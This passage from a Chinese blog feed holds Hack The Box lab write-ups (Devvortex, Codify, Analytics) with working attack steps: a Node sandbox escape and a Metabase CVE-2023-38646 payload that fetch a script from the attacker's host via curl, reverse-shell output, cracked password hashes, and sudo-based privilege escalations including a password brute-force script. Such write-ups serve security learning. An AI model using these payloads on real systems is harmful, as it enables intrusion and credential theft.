class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class=\"line\">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class=\"line\">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class=\"line\">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class=\"line\">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class=\"line\">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class=\"line\">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class=\"line\">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class=\"line\">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class=\"line\">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class=\"line\">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class=\"line\">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class=\"line\">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class=\"line\">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class=\"line\">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class=\"line\">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class=\"line\">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">messagebus:x:103:106::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">syslog:x:104:110::/home/syslog:/usr/sbin/nologin</span><br><span class=\"line\">_apt:x:105:65534::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false</span><br><span class=\"line\">uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin</span><br><span class=\"line\">tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin</span><br><span class=\"line\">landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin</span><br><span class=\"line\">pollinate:x:110:1::/var/cache/pollinate:/bin/false</span><br><span class=\"line\">sshd:x:111:65534::/run/sshd:/usr/sbin/nologin</span><br><span class=\"line\">systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin</span><br><span class=\"line\">lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false</span><br><span class=\"line\">usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin</span><br><span class=\"line\">fwupd-refresh:x:113:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin</span><br><span class=\"line\">mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br><span class=\"line\">_laurel:x:997:997::/var/log/laurel:/bin/false</span><br></pre></td></tr></table></figure></p>\n<p>查看到有 /bin/bash 的用户有</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root:x:0:0:root:/root:/bin/bash</span><br><span class=\"line\">logan:x:1000:1000:,,,:/home/logan:/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>现在我们的目标就是 logan</p>\n<p>然后通过一开始获得的账号密码登录 mysql</p>\n<p>在 select * from sd4fg_user 得到 logan 的密码串，然后通过 john 进行解密</p>\n<p>得到了 logan 密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">爆破出密码是tequieromucho</span><br></pre></td></tr></table></figure></p>\n<p>获取到 logan 的密码后登录</p>\n<p>提交 user.txt</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>然后 sudo -l</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">logan@devvortex:~$ sudo -l</span><br><span class=\"line\">Matching Defaults entries for logan on devvortex:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin</span><br><span class=\"line\"></span><br><span class=\"line\">User logan may run the following commands on devvortex:</span><br><span class=\"line\">    (ALL : ALL) /usr/bin/apport-cli</span><br></pre></td></tr></table></figure></p>\n<p>通过</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo /usr/bin/apport-cli -c test.log less</span><br><span class=\"line\">V</span><br><span class=\"line\">!/bin/bash</span><br></pre></td></tr></table></figure></p>\n<p>获取到 root 权限</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Codify/",
            "url": "https://lookhui.github.io/HTB-Codify/",
            "title": "HTB-Codify",
            "date_published": "2023-12-14T06:52:58.000Z",
            "content_html": "<h1 id=\"codify\"><a class=\"anchor\" href=\"#codify\">#</a> Codify</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描 ip 并且浏览器访问 ip</p>\n<p>加上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.239 codify.htb</span><br></pre></td></tr></table></figure></p>\n<p>nmap 扫描出打开了 3 个端口</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 14:56 中国标准时间</span><br><span class=\"line\">Nmap scan report for codify.htb (10.10.11.239)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 997 closed tcp ports (reset)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">22/tcp   open  ssh</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">3000/tcp open  ppp</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 62.45 seconds</span><br></pre></td></tr></table></figure></p>\n<p>3000 和 80 都是一样的 web 界面我们直接在 js 上执行命令</p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">const vm = require(&#x27;vm&#x27;);</span><br><span class=\"line\">const script = `</span><br><span class=\"line\">const process = this.toString.constructor(&#x27;return process&#x27;)()</span><br><span class=\"line\">process.mainModule.require(&#x27;child_process&#x27;).execSync(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;).toString()</span><br><span class=\"line\">`;</span><br><span class=\"line\">const sandbox = &#123; m: 1, n: 2 &#125;;</span><br><span class=\"line\">const context = new vm.createContext(sandbox);</span><br><span class=\"line\">const res = vm.runInContext(script, context);</span><br><span class=\"line\">console.log(res)</span><br></pre></td></tr></table></figure></p>\n<p>我一开始想直接执行反弹 shell 但是失败现在下载试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">listening on [any] 9999 ...</span><br><span class=\"line\">connect to [10.10.14.54] from (UNKNOWN) [10.10.11.239] 56918</span><br><span class=\"line\">bash: cannot set terminal process group (1257): Inappropriate ioctl for device</span><br><span class=\"line\">bash: no job control in this shell</span><br><span class=\"line\">svc@codify:~$ ls</span><br><span class=\"line\">ls</span><br></pre></td></tr></table></figure></p>\n<p>成功反弹</p>\n<p>开始找第一个 flag</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">查看home文件下面的内容发现有两个文件</span><br><span class=\"line\">svc@codify:/home$ ls /home</span><br><span class=\"line\">ls /home</span><br><span class=\"line\">joshua</span><br><span class=\"line\">svc</span><br></pre></td></tr></table></figure></p>\n<p>可能 flag 就在这个 joshua 里面</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">svc@codify:/var/www/contact$ cat tickets.db</span><br><span class=\"line\">cat tickets.db</span><br><span class=\"line\">?T5??T?tableticketsticketsCREATE TABLE tickets (id INTEGER PRIMARY KEY AUTOINCREMENT, name TEXT, topic TEXT, description TEXT, status TEXT)P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)??tableusersusersCREATE TABLE users (</span><br><span class=\"line\">        id INTEGER PRIMARY KEY AUTOINCREMENT,</span><br><span class=\"line\">        username TEXT UNIQUE,</span><br><span class=\"line\">        password TEXT</span><br><span class=\"line\">??G?joshua$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2</span><br><span class=\"line\">??</span><br><span class=\"line\">????ua  users</span><br><span class=\"line\">ickets</span><br><span class=\"line\">r]r乭%%?Joe WilliamsLocal setup?I use this site lot of the time. Is it possible to set this up locally? Like instead of coming to this site, can I download this and set it up in my own computer? A feature like that would be nice.open?;亀Tom HanksNeed networking modulesI think it would be better if you can implement a way to handle network-based stuff. Would help me out a lot. Thanks!open</span><br></pre></td></tr></table></figure></p>\n<p>在这个 var/www/contact 里面发现了 joshua 的信息</p>\n<p>还有他的密码串我们使用 john 来进行解码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br></pre></td></tr></table></figure></p>\n<p>解了 2 分钟就得到密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">└─$ john 1.txt</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])</span><br><span class=\"line\">Cost 1 (iteration count) is 4096 for all loaded hashes</span><br><span class=\"line\">Will run 16 OpenMP threads</span><br><span class=\"line\">Proceeding with single, rules:Single</span><br><span class=\"line\">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class=\"line\">Almost done: Processing the remaining buffered candidate passwords, if any.</span><br><span class=\"line\">Proceeding with wordlist:/usr/share/john/password.lst</span><br><span class=\"line\">spongebob1       (?)</span><br><span class=\"line\">1g 0:00:01:50 DONE 2/3 (2023-12-14 15:18) 0.009071g/s 108.4p/s 108.4c/s 108.4C/s steph1..gatita1</span><br><span class=\"line\">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure></p>\n<p>使用 ssh 连接</p>\n<p>flag1 就在目录下</p>\n<h4 id=\"提权\"><a class=\"anchor\" href=\"#提权\">#</a> 提权</h4>\n<p>使用 sudo -l</p>\n<p>输入密码</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[sudo] password for joshua:</span><br><span class=\"line\">Matching Defaults entries for joshua on codify:</span><br><span class=\"line\">    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin,</span><br><span class=\"line\">    use_pty</span><br><span class=\"line\"></span><br><span class=\"line\">User joshua may run the following commands on codify:</span><br><span class=\"line\">    (root) /opt/scripts/mysql-backup.sh</span><br></pre></td></tr></table></figure></p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS1teXNxbC1iYWNrdXAtdnoweG40NWEuc2g=\">打开 mysql-backup.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">#!/bin/bash</span><br><span class=\"line\">DB_USER=&quot;root&quot;</span><br><span class=\"line\">DB_PASS=$(/usr/bin/cat /root/.creds)</span><br><span class=\"line\">BACKUP_DIR=&quot;/var/backups/mysql&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">read -s -p &quot;Enter MySQL password for $DB_USER: &quot; USER_PASS</span><br><span class=\"line\">/usr/bin/echo</span><br><span class=\"line\"></span><br><span class=\"line\">if [[ $DB_PASS == $USER_PASS ]]; then</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmed!&quot;</span><br><span class=\"line\">else</span><br><span class=\"line\">        /usr/bin/echo &quot;Password confirmation failed!&quot;</span><br><span class=\"line\">        exit 1</span><br><span class=\"line\">fi</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/mkdir -p &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">databases=$(/usr/bin/mysql -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; -e &quot;SHOW DATABASES;&quot; | /usr/bin/grep -Ev &quot;(Database|information_schema|performance_schema)&quot;)</span><br><span class=\"line\"></span><br><span class=\"line\">for db in $databases; do</span><br><span class=\"line\">    /usr/bin/echo &quot;Backing up database: $db&quot;</span><br><span class=\"line\">    /usr/bin/mysqldump --force -u &quot;$DB_USER&quot; -h 0.0.0.0 -P 3306 -p&quot;$DB_PASS&quot; &quot;$db&quot; | /usr/bin/gzip &gt; &quot;$BACKUP_DIR/$db.sql.gz&quot;</span><br><span class=\"line\">done</span><br><span class=\"line\"></span><br><span class=\"line\">/usr/bin/echo &quot;All databases backed up successfully!&quot;</span><br><span class=\"line\">/usr/bin/echo &quot;Changing the permissions&quot;</span><br><span class=\"line\">/usr/bin/chown root:sys-adm &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/chmod 774 -R &quot;$BACKUP_DIR&quot;</span><br><span class=\"line\">/usr/bin/echo &#x27;Done!&#x27;</span><br></pre></td></tr></table></figure></p>\n<p>这里的话使用脚本</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import subprocess</span><br><span class=\"line\">import string</span><br><span class=\"line\">def run_command(command):</span><br><span class=\"line\">    output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE).stdout.decode()</span><br><span class=\"line\">    return output</span><br><span class=\"line\"></span><br><span class=\"line\">dic=string.ascii_letters+string.digits</span><br><span class=\"line\">password=&quot;&quot;</span><br><span class=\"line\">for i in range(100):</span><br><span class=\"line\">    for i in dic:</span><br><span class=\"line\">        output= run_command(f&#x27;echo &quot;&#123;password&#125;&#123;i&#125;*&quot; | sudo /opt/scripts/mysql-backup.sh&#x27;)</span><br><span class=\"line\">        if &quot;Password confirmed&quot; in output:</span><br><span class=\"line\">            password+=i</span><br><span class=\"line\">            print(password)</span><br><span class=\"line\">            break</span><br></pre></td></tr></table></figure></p>\n<p>得到 root 密码</p>\n<p>得到密码后不要使用 ssh 连接直接使用 su root 即可</p>\n",
            "tags": [
                "渗透"
            ]
        },
        {
            "id": "https://lookhui.github.io/HTB-Analytics/",
            "url": "https://lookhui.github.io/HTB-Analytics/",
            "title": "HTB-Analytics",
            "date_published": "2023-12-14T04:54:18.000Z",
            "content_html": "<h1 id=\"analytics\"><a class=\"anchor\" href=\"#analytics\">#</a> Analytics</h1>\n<h4 id=\"信息收集\"><a class=\"anchor\" href=\"#信息收集\">#</a> 信息收集</h4>\n<p>nmap 扫描同时 http 访问</p>\n<p>换上 hosts</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Starting Nmap 7.93 ( https://nmap.org ) at 2023-12-14 12:55 中国标准时间</span><br><span class=\"line\">Nmap scan report for bogon (10.10.11.233)</span><br><span class=\"line\">Host is up (0.33s latency).</span><br><span class=\"line\">Not shown: 998 closed tcp ports (reset)</span><br><span class=\"line\">PORT   STATE SERVICE</span><br><span class=\"line\">22/tcp open  ssh</span><br><span class=\"line\">80/tcp open  http</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 50.99 seconds</span><br></pre></td></tr></table></figure></p>\n<p>hosts 换好后进行目录扫描</p>\n<p>查看主页面有一个登录 login 进去后发现域名是</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/</span><br></pre></td></tr></table></figure></p>\n<p>把 hosts 添加上</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">10.10.11.233 data.analytical.htb</span><br></pre></td></tr></table></figure></p>\n<p>查看到 cookie 是 metabase 服务</p>\n<p>可以试试</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Metabase 远程代码执行漏洞(CVE-2023-38646)</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"反弹shell\"><a class=\"anchor\" href=\"#反弹shell\">#</a> 反弹 shell</h4>\n<p>首先访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/session/properties</span><br></pre></td></tr></table></figure></p>\n<p>得到 token</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&quot;setup-token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br></pre></td></tr></table></figure></p>\n<p>在访问</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http://data.analytical.htb/api/setup/validate</span><br></pre></td></tr></table></figure></p>\n<p>构造 exp</p>\n<p>在本地执行 python -m http.server 80</p>\n<p><span class=\"exturl\" data-url=\"aHR0cDovL3huLS0yLXpuNmE5YjlkcjByNWl4ODBmLnNo\">并且写入一个 2.sh</span></p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: null,</span><br><span class=\"line\">        &quot;refingerprint&quot;: false,</span><br><span class=\"line\">        &quot;auto_run_queries&quot;: true,</span><br><span class=\"line\">        &quot;schedules&quot;:</span><br><span class=\"line\">        &#123;&#125;,</span><br><span class=\"line\">        &quot;details&quot;:</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            &quot;db&quot;: &quot;zip:/app/metabase.jar!/sample-database.db;MODE=MSSQLServer;TRACE_LEVEL_SYSTEM_OUT=1\\\\;CREATE TRIGGER pwnshell BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$//javascript\\njava.lang.Runtime.getRuntime().exec(&#x27;curl -o /tmp/2.sh http://10.10.14.54/2.sh&#x27;)\\n$$--=x&quot;,</span><br><span class=\"line\">            &quot;advanced-options&quot;: false,</span><br><span class=\"line\">            &quot;ssl&quot;: true</span><br><span class=\"line\">        &#125;,</span><br><span class=\"line\">        &quot;name&quot;: &quot;an-sec-research-team&quot;,</span><br><span class=\"line\">        &quot;engine&quot;: &quot;h2&quot;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure></p>\n<p>通过 curl 得到 2.sh 并且放在 tmp 文件夹下</p>\n<p>在使用</p>\n<p><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">POST /api/setup/validate HTTP/1.1</span><br><span class=\"line\">Host: data.analytical.htb</span><br><span class=\"line\">Content-Type:application/json</span><br><span class=\"line\">Cache-Control: max-age=0</span><br><span class=\"line\">Upgrade-Insecure-Requests: 1</span><br><span class=\"line\">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.54 Safari/537.36</span><br><span class=\"line\">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class=\"line\">Accept-Encoding: gzip, deflate</span><br><span class=\"line\">Accept-Language: zh-CN,zh;q=0.9</span><br><span class=\"line\">Cookie: metabase.DEVICE=17645f70-ae73-4c86-a81c-ab6fdaa2ccf7</span><br><span class=\"line\">Connection: close</span><br><span class=\"line\">Content-Length: 741</span><br><span class=\"line\"></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    &quot;token&quot;: &quot;249fa03d-fd94-4d5b-b94f-b4ebf3df681f&quot;,</span><br><span class=\"line\">    &quot;details&quot;:</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        &quot;is_on_demand&quot;: false,</span><br><span class=\"line\">        &quot;is_full_sync&quot;: false,</span><br><span class=\"line\">        &quot;is_sample&quot;: false,</span><br><span class=\"line\">        &quot;cache_ttl&quot;: 